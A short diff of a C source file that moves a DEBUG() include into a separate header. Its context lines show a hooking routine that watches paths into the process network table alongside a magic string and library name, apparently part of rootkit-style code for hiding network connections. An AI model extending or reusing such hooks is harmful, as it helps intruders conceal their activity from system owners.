@@ -21,8 +21,9 @@
 #include <sys/stat.h> /* struct stat */
 #include <string.h> /* strstr() */
 #include <limits.h> /* PATH_MAX */
-#include "beurk.h" /* DEBUG(),  prototype */
+#include "beurk.h" /* prototype */
 #include "config.h" /* PROC_NET_TCP, MAGIC_STRING, LIBRARY_NAME, ... */
+#include "debug.h" /* DEBUG() */
 
 /** is_procnet detects any path going into PROC_NET_TCP, allowing our hooks to
  * react accordingly.
